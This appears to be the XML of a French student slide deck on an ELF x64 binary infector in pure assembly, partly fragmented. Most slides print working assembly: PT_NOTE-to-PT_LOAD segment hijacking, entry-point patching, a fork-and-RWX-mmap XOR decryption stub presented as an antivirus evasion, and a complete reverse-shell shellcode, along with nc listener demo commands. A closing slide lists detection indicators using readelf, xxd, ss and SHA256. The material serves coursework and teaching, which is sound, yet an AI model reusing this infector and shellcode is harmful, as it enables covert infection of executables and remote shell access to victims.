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9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695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0292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00584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50876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01168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51460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01752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52044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02336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2628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02920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53212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03504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53796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04088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54380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804672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854964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905256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955548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274320" y="10972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Infecteur ELF x64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" y="182880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Assembleur Pur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2286000" y="2468880"/>
            <a:ext cx="4572000" cy="4572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274320" y="2578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PT_NOTE → PT_LOAD  ·  Reverse Shell XOR  ·  Syscalls directs  ·  Sans libc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" y="3108960"/>
            <a:ext cx="3200400" cy="14630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914400" y="3108960"/>
            <a:ext cx="3200400" cy="54864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1024128" y="32004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Elias ZOHRI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" y="3547872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d'Infection ELF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3822192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elf_parser.asm  ·  sc_msg.asm  ·  bind_shell.asm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" y="4224528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917 lignes ASM pur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0" y="3108960"/>
            <a:ext cx="3200400" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1905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5029200" y="3108960"/>
            <a:ext cx="3200400" cy="54864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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5138928" y="32004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 BROU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138928" y="3547872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Offensif XOR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138928" y="3822192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reverse_shell_core.asm  ·  xor_stub.asm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xor_encoder.asm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5138928" y="4224528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+ mmap RWX + XOR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Cybersécurité ESGI  ·  Octobre 2026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164592" y="91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Le Projet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4592" y="566928"/>
            <a:ext cx="91440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64592" y="6126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Infecteur ELF x64 en ASM pur · Deux parties complémentaires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Elias + Christ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987552"/>
            <a:ext cx="8814816" cy="640080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274320" y="1051560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modifier un binaire ELF Linux pour y injecter un shellcode,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que le programme ne change de comportement apparent pour la victime.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" y="1783080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Déroulé de la présentation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" y="2148840"/>
            <a:ext cx="8814816" cy="804672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64592" y="2148840"/>
            <a:ext cx="548640" cy="80467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164592" y="214884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212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Elias — Le Moteur d'Infection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505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ELF · PT_NOTE→PT_LOAD · Patch e_entry · Démo Kali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3081528"/>
            <a:ext cx="8814816" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1905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64592" y="3081528"/>
            <a:ext cx="548640" cy="804672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164592" y="3081528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1455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 — Le Payload Offensif XOR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4381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shell · Chiffrement XOR · mmap RWX · Démo Codespaces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" y="4014216"/>
            <a:ext cx="8814816" cy="804672"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill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64592" y="4014216"/>
            <a:ext cx="548640" cy="804672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164592" y="4014216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07822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— Détection &amp; Conclusion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3708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SIEM détecterait · readelf · xxd · Q/A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823960" y="4736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164592" y="91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Format ELF — Structure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4592" y="566928"/>
            <a:ext cx="91440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64592" y="6126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 = Executable and Linkable Format · Le format des binaires Linux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Elias ZOHRI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987552"/>
            <a:ext cx="4114800" cy="384048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164592" y="9875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ELF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3895344" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A5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384048" y="1417320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 Header (64 bytes)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" y="1645920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· e_entry · e_phoff · e_phnum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993392"/>
            <a:ext cx="3895344" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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384048" y="2039112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Headers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" y="2267712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PT_LOAD · PT_NOTE · PT_DYNAMIC...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615184"/>
            <a:ext cx="3895344" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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384048" y="2660904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.text (code)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" y="2889504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assembleur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236976"/>
            <a:ext cx="3895344" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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384048" y="3282696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" y="3511296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initialisées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858768"/>
            <a:ext cx="3895344" cy="548640"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50"/>
          </a:solidFill>
          <a:ln w="1270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384048" y="3904488"/>
            <a:ext cx="3675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PT_NOTE ← ON CIBLE ÇA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" y="4133088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inutilisé → on le vole !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80560" y="987552"/>
            <a:ext cx="4480560" cy="1828800"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A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4572000" y="1033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technique PT_NOTE → PT_LOAD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1353312"/>
            <a:ext cx="42976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On cherche un segment PT_NOTE (type=4)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inutile, jamais exécuté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On le convertit en PT_LOAD (type=1)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sera chargé ET exécuté par le kernel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On injecte notre shellcode à la fin du fichier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dans ce nouveau segment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On modifie e_entry pour pointer vers notre code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2944368"/>
            <a:ext cx="4480560" cy="1883664"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1270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4572000" y="2999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32918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 :  e_entry = 0x401050  →  Hello ELF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 :  e_entry = 0x406000  →  shellcode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puis  →  0x401050  →  Hello ELF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victime ne voit aucune différence !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823960" y="4736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164592" y="91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elf_parser.asm — Le Moteur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4592" y="566928"/>
            <a:ext cx="91440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64592" y="6126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ASM x64 · Syscalls directs · Sans libc · 917 lignes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Elias ZOHRI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" y="98755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Vérification magic ELF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" y="1243584"/>
            <a:ext cx="434340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64592" y="1243584"/>
            <a:ext cx="4343400" cy="36576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256032" y="1335024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Lit les 64 bytes du header ELF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rax, SYS_READ       ; syscall 0 = read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edi, [fd_elf]       ; fd du fichier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     rsi, [ehdr]         ; buffer destination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edx, 64             ; 64 bytes = taille header ELF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syscall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Vérifie le magic number 0x7F 'E' 'L' 'F'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cmp     byte [ehdr],     0x7F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cmp     byte [ehdr + 1], 'E'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cmp     byte [ehdr + 2], 'L'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cmp     byte [ehdr + 3], 'F'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64592" y="303580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Conversion PT_NOTE → PT_LOAD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" y="3291840"/>
            <a:ext cx="4343400" cy="704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64592" y="3291840"/>
            <a:ext cx="434340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256032" y="3383280"/>
            <a:ext cx="4160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Transforme le segment inutile en segment exécutable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dword [r15], PT_LOAD      ; p_type =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dword [r15 + 4], PF_RX   ; p_flags = 5 (R|X)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qword [r15 + 48], PAGE_SIZE ; p_align = 0x1000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" y="4114800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Redirection e_entry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" y="4370832"/>
            <a:ext cx="43434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64592" y="4370832"/>
            <a:ext cx="4343400" cy="36576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256032" y="4462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Patch le point d'entrée → notre shellcode s'exécute en premier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rax, [new_vaddr]    ; adresse du shellcode (ex: 0x406000)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[ehdr + 24], rax   ; ehdr+24 = champ e_entry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987552"/>
            <a:ext cx="4270248" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1520"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="00D4F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709160" y="987552"/>
            <a:ext cx="4270248" cy="274320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800600" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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956048" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5111496" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5276088" y="1051560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2825496"/>
            <a:ext cx="4087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./elf_parser ls_inf sc_msg.bin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 PT_NOTE trouvé + e_entry patchée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4736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713A93B5-AACD-5B21-A21C-D47656EFA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2041652"/>
            <a:ext cx="4270248" cy="123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164592" y="91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Elias — sc_msg &amp; Bind Shell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4592" y="566928"/>
            <a:ext cx="91440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64592" y="6126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du retour e_entry · Obligation minimale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Elias ZOHRI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" y="98755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sc_msg.asm — Retour e_entry ASLR-compatible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" y="1243584"/>
            <a:ext cx="4343400" cy="1920240"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D111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64592" y="1243584"/>
            <a:ext cx="4343400" cy="36576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256032" y="1335024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Affiche INFECTE! puis retourne au programme original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al, 1               ; syscall write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     rsi, [rel msg]      ; adresse du message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dl, 9               ; 9 bytes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syscall                     ; affiche "INFECTE!\n"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Saut vers e_entry (patché par elf_parser)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   $+5                 ; push RIP → rbx = adresse courante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pop     rbx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   rbx, 0x41414141    ; ← 0x41414141 remplacé par l'offset réel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jmp     rbx                 ; saute vers e_entry original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msg: db "INFECTE!", 10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592" y="3291840"/>
            <a:ext cx="434340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274320" y="33375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1 — Retour e_entry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35661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/bin/ls ls_inf  &amp;&amp;  ./elf_parser ls_inf sc_msg.bin  &amp;&amp;  ./ls_inf --version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4592" y="3913632"/>
            <a:ext cx="4343400" cy="530352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274320" y="3959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2 — Bind Shell (obligation minimale)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74320" y="4187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./elf_parser ls_inf bind_shell.bin  &amp;&amp;  ./ls_inf  |  nc 127.0.0.1 4444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987552"/>
            <a:ext cx="4270248" cy="3931920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1520"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="FFB80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09160" y="987552"/>
            <a:ext cx="4270248" cy="274320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800600" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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956048" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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111496" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5276088" y="1051560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2825496"/>
            <a:ext cx="4087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INFECTE! + ls --version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bind shell reçu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4736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4F06C28-64E7-D34A-CD42-D2FE5AD36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807208"/>
            <a:ext cx="4343400" cy="4493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164592" y="91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Payload Offensif XOR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4592" y="566928"/>
            <a:ext cx="914400" cy="36576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64592" y="6126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Pourquoi XOR · fork + mmap RWX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Christ BROU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987552"/>
            <a:ext cx="4297680" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1270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274320" y="1033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chiffrer le shellcode ?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" y="1325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disque → bytes XOR → illisibles → antivirus ne détecte rien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mémoire → déchiffrement XOR → shellcode original → exécuté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XOR clé = B     →     B XOR clé = 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opération pour chiffrer et déchiffrer !  Clé = 0x41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4592" y="2514600"/>
            <a:ext cx="4297680" cy="2359152"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A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274320" y="2560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 fichiers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07792"/>
            <a:ext cx="4114800" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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384048" y="294436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xor_encoder.asm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84048" y="3163824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le shellcode brut → XOR 0x41 → écrit _xor.bin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529584"/>
            <a:ext cx="4114800" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50"/>
          </a:solidFill>
          <a:ln w="1270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384048" y="356616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reverse_shell_core.asm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84048" y="3785616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+ connect + dup2 + execve → shellcode brut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4151376"/>
            <a:ext cx="4114800" cy="530352"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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384048" y="418795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xor_stub.asm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84048" y="4407408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+ mmap RWX + déchiffre + exécute → injecté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987552"/>
            <a:ext cx="4315968" cy="3886200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1270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4773168" y="1033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73168" y="1389888"/>
            <a:ext cx="4114800" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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4846320" y="14264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193792" y="144475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 → reverse_shell_core.bin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193792" y="16642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shellcode brut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73168" y="2048256"/>
            <a:ext cx="4114800" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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4846320" y="208483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193792" y="210312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./xor_encoder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193792" y="23225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XOR 0x41 → _xor.bin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73168" y="2706624"/>
            <a:ext cx="4114800" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A5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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320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193792" y="27614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nasm → xor_stub.bin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193792" y="29809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incbin _xor.bin dedans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73168" y="3364992"/>
            <a:ext cx="4114800" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50"/>
          </a:solidFill>
          <a:ln w="1270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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="34015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5193792" y="34198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./elf_parser cobaye xor_stub.bin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193792" y="36393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dans cobaye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73168" y="4023360"/>
            <a:ext cx="4114800" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A50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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4846320" y="405993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193792" y="407822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./cobaye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5193792" y="429768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ELF + reverse shell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8823960" y="4736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164592" y="91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xor_stub.asm — Le Stub Injecté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4592" y="566928"/>
            <a:ext cx="914400" cy="36576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64592" y="6126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invisible · mmap RWX · déchiffrement XOR · retour père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Christ BROU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" y="9875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xor_stub.asm — fork + mmap + déchiffrement (code exact)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" y="1243584"/>
            <a:ext cx="4572000" cy="3675888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1117"/>
          </a:solidFill>
          <a:ln w="1270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64592" y="1243584"/>
            <a:ext cx="4572000" cy="36576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256032" y="1335024"/>
            <a:ext cx="438912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fork() — crée un fils invisible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   rax, rax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al, 57              ; syscall 57 = fork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syscall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    rax, rax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jnz     retour_pere         ; père → Hello ELF / fils → reverse shell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FILS : mmap zone RWX (contourne la protection W^X)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   rdi, rdi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rsi, 0x1000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rdx, 7              ; PROT_READ|WRITE|EXEC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r10, 0x22           ; MAP_ANON|MAP_PRIVATE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r8, -1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   r9, r9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rax, 9              ; syscall 9 = mmap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syscall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r15, rax            ; r15 = adresse zone RWX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Copie + déchiffrement XOR 0x41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     rsi, [rel payload]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rdi, r15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rcx, payload_fin - payload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r14, rcx            ; sauvegarde (rep movsb écrase rcx !)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     movsb               ; copie payload vers zone RWX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rsi, r15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rcx, r14            ; restaure le compteur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dechiffre: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   byte [rsi], 0x41   ; déchiffre byte par byte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     rsi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   dechiffre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jmp     r15                 ; exécute le shellcode déchiffré !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retour_pere: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rax, 0x401050       ; e_entry original (cobaye -no-pie)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jmp     rax                 ; Hello, Warehouse Manager!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37760" y="987552"/>
            <a:ext cx="4041648" cy="1463040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1270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5047488" y="1033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W^X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13258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interdit qu'une zone mémoire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Write ET Execute en même temps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Impossible de modifier en mémoire exécutable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Solution : mmap(RWX) crée une zone spéciale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37760" y="2578608"/>
            <a:ext cx="4041648" cy="13258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5047488" y="2624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résolu — rcx écrasé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47488" y="2907792"/>
            <a:ext cx="3840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movsb met rcx à 0 à la fin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boucle XOR ne tournait pas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Solution : sauvegarder dans r14 avant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restaurer depuis r14 après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3977640"/>
            <a:ext cx="4041648" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1520"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="00FF9F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937760" y="3977640"/>
            <a:ext cx="4041648" cy="274320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029200" y="4050792"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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184648" y="4050792"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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340096" y="4050792"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5504688" y="40416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4297680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./cobaye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Warehouse Manager!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4736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A31B0EDF-FFAC-5A5B-5117-0A3C5DFA1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325112"/>
            <a:ext cx="4087221" cy="4708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164592" y="91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reverse_shell_core.asm — Le Shellcode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4592" y="566928"/>
            <a:ext cx="914400" cy="36576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64592" y="6126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connect(127.0.0.1:4444) · dup2 · execve /bin//sh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Christ BROU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" y="9875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reverse_shell_core.asm — Reverse shell (code exact)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" y="1243584"/>
            <a:ext cx="4572000" cy="3675888"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1117"/>
          </a:solidFill>
          <a:ln w="1270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64592" y="1243584"/>
            <a:ext cx="4572000" cy="36576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256032" y="1335024"/>
            <a:ext cx="438912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socket(AF_INET, SOCK_STREAM, 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   rax, rax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al, 41              ; syscall 41 = socket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dil, 2              ; AF_INET = IPv4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sil, 1              ; SOCK_STREAM = TCP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   rdx, rdx            ; protocole = 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syscall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r12, rax            ; r12 = fd socket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connect(sockfd, {AF_INET, 4444, 127.0.0.1}, 16)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   rax, rax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push    rax                 ; padding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word  [rsp],   0x0002      ; AF_INET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word  [rsp+2], 0x5C11     ; port 4444 big-endian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dword [rsp+4], 0x0100007f ; IP 127.0.0.1 little-endian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rsi, rsp            ; pointeur vers sockaddr_in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rax, 42             ; syscall 42 = connect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rdi, r12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rdx, 16             ; sizeof(sockaddr_in)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syscall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dup2(sockfd, 0/1/2) — redirige stdin/stdout/stderr vers la socket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   rsi, rsi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dup_loop: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al, 33              ; syscall 33 = dup2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rdi, r12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syscall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     rsi                 ; 0→1→2 (stdin→stdout→stderr)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cmp     rsi, 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jne     dup_loop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execve("/bin//sh", NULL, NULL) — ouvre le shell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   rax, rax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push    rax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rbx, 0x68732F6E69622F2F  ; "/bin//sh" little-endian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push    rbx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rdi, rsp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   rsi, rsi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   rdx, rdx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al, 59              ; syscall 59 = execve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syscall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37760" y="987552"/>
            <a:ext cx="4041648" cy="1188720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A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5047488" y="1033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4444 en big-endian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1316736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x64 = little-endian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TCP/IP = big-endian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4444 décimal = 0x115C hexa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 écrit 0x5C11 en mémoire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37760" y="2286000"/>
            <a:ext cx="4041648" cy="2615184"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1520"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="FF406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937760" y="2286000"/>
            <a:ext cx="4041648" cy="274320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5029200" y="2359152"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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184648" y="2359152"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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340096" y="2359152"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5504688" y="23500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465576"/>
            <a:ext cx="3858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nc -lvnp 4444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received + id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823960" y="4736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23AD1E42-164F-A7D4-94DE-3934C207E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216" y="3054096"/>
            <a:ext cx="4076159" cy="969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164592" y="91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xor_encoder.asm — Encodeur &amp; Démo Finale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4592" y="566928"/>
            <a:ext cx="914400" cy="36576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64592" y="6126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le shellcode sur disque · Démo connexion reçue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Christ BROU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" y="98755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xor_encoder.asm — Boucle XOR (code exact)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" y="1243584"/>
            <a:ext cx="4434840" cy="2990088"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1117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64592" y="1243584"/>
            <a:ext cx="443484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256032" y="1335024"/>
            <a:ext cx="425196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Lit le shellcode brut, XOR chaque byte, écrit le résultat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boucle_lecture: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rax, 0              ; syscall 0 = read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rdi, r12            ; fd source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     rsi, [buffer]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rdx, 4096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syscall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    rax, rax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jle     fermer              ; 0 = fin de fichier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r14, rax            ; r14 = bytes lus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; XOR chaque byte avec la clé 0x41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     rsi, [buffer]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rcx, r14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boucle_xor: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   byte [rsi], 0x41   ; chiffrement = déchiffrement (même opération !)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     rsi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   boucle_xor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rax, 1              ; syscall 1 = write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rdi, r13            ; fd destination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     rsi, [buffer]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     rdx, r14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syscall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jmp     boucle_lecture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4592" y="4343400"/>
            <a:ext cx="4434840" cy="566928"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1270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274320" y="43891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démo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45902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./elf_parser cobaye xor_stub.bin  →  Terminal 2: nc -lvnp 4444  →  ./cobaye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987552"/>
            <a:ext cx="4178808" cy="2194560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1520"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="FFB80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800600" y="987552"/>
            <a:ext cx="4178808" cy="274320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892040" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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047488" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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202936" y="1060704"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5367528" y="1051560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1956816"/>
            <a:ext cx="3995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xxd cobaye | tail -8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XOR illisibles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291840"/>
            <a:ext cx="4178808" cy="1618488"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1520"/>
          </a:solidFill>
          <a:ln w="25400">
            <a:solidFill>
              <a:srgbClr val="FF406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800600" y="3291840"/>
            <a:ext cx="4178808" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2A3A5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892040" y="3364992"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5047488" y="3364992"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5202936" y="3364992"/>
            <a:ext cx="118872" cy="118872"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse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5367528" y="335584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4892040" y="3973068"/>
            <a:ext cx="3995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Connection received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+ whoami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823960" y="4736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7EDDAC37-76A1-0D21-C076-29A263693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698498"/>
            <a:ext cx="3811735" cy="962406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E95EDB17-DBCD-3773-347A-405B4BF25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961" y="3693134"/>
            <a:ext cx="4076159" cy="969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54864" cy="5079492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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="164592" y="914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— Comment le défenseur s'en rendrait compte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4592" y="566928"/>
            <a:ext cx="914400" cy="36576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164592" y="61264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· readelf · xxd · Indicateurs de compromission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Elias + Christ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" y="987552"/>
            <a:ext cx="8814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compromission (IOC)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4592" y="1389888"/>
            <a:ext cx="4297680" cy="1115568"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1905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64592" y="1389888"/>
            <a:ext cx="4297680" cy="54864"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF40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274320" y="148132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SIEM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" y="1792224"/>
            <a:ext cx="4078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sortante inhabituelle sur le port 4444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Règle : alerte sur tout trafic sortant hors whitelist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4592" y="2651760"/>
            <a:ext cx="4297680" cy="1115568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64592" y="2651760"/>
            <a:ext cx="4297680" cy="54864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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="274320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readelf -l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" y="3054096"/>
            <a:ext cx="4078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PT_NOTE avec flags R E (executable)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Anomalie : PT_NOTE ne devrait jamais être exécutable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389888"/>
            <a:ext cx="4297680" cy="1115568"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1905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17720" y="1389888"/>
            <a:ext cx="4297680" cy="54864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4727448" y="1481328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1792224"/>
            <a:ext cx="4078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illisibles en fin de fichier ELF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f1 78 4e 44 09 c4 81 34... = shellcode XOR encodé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2651760"/>
            <a:ext cx="4297680" cy="1115568"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="1905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617720" y="2651760"/>
            <a:ext cx="4297680" cy="54864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4727448" y="2743200"/>
            <a:ext cx="4078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27448" y="3054096"/>
            <a:ext cx="4078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du binaire différent de la version officielle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Preuve de modification post-installation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4592" y="4023360"/>
            <a:ext cx="8814816" cy="841248"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="0D1117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274320" y="409651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readelf -l cobaye | grep NOTE    →    NOTE  0x406000  R E  ← SUSPECT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xxd cobaye | tail -8              →    f1 78 4e 44 09 c4 81 34 ...  ← XOR encodé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ss -tnp | grep 4444              →    connexion sortante détectée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823960" y="47365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3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625F69A4-C594-5AE7-11C4-1459B79CE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256786"/>
            <a:ext cx="7099300" cy="520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0292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00584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50876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01168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51460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01752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52044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02336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2628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02920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53212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03504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53796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04088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54380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804672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854964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905256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9555480" y="0"/>
            <a:ext cx="914" cy="5143500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2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6858000" y="91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Elias + Christ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03320" y="365760"/>
            <a:ext cx="1737360" cy="1737360"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1E2A3A"/>
          </a:solidFill>
          <a:ln w="254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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3703320" y="65836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274320" y="230428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Questions</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="2907792"/>
            <a:ext cx="3657600" cy="45720"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="00FF9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3090672"/>
            <a:ext cx="2697480" cy="1783080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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="384048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84048" y="3493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elf_parser.asm — 917 lignes ASM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384048" y="3840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PT_NOTE → PT_LOAD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84048" y="4187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Patch e_entry + retour ASLR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384048" y="4535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sc_msg.bin + bind_shell.bin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82112" y="3090672"/>
            <a:ext cx="2697480" cy="17830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4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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="329184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291840" y="3493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Reverse shell XOR chiffré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291840" y="3840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fork + mmap RWX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3291840" y="4187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xor_encoder.asm 100% ASM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3291840" y="4535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Connexion nc reçue ✅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089904" y="3090672"/>
            <a:ext cx="2697480" cy="17830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 txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6199632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199632" y="34930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Syscalls directs sans libc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199632" y="3840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W^X contourné par mmap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6199632" y="41879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XOR = même op chiffre/déchiffre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6199632" y="4535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SHA256 aurait détecté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 BROU  ·  Elias ZOHRI  ·  Bachelor Cybersécurité ESGI  ·  Octobre 2026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rojetELF">
  <a:themeElements>
    <a:clrScheme name="ProjetELF">
      <a:dk1>
        <a:srgbClr val="0A0E1A"/>
      </a:dk1>
      <a:lt1>
        <a:srgbClr val="FFFFFF"/>
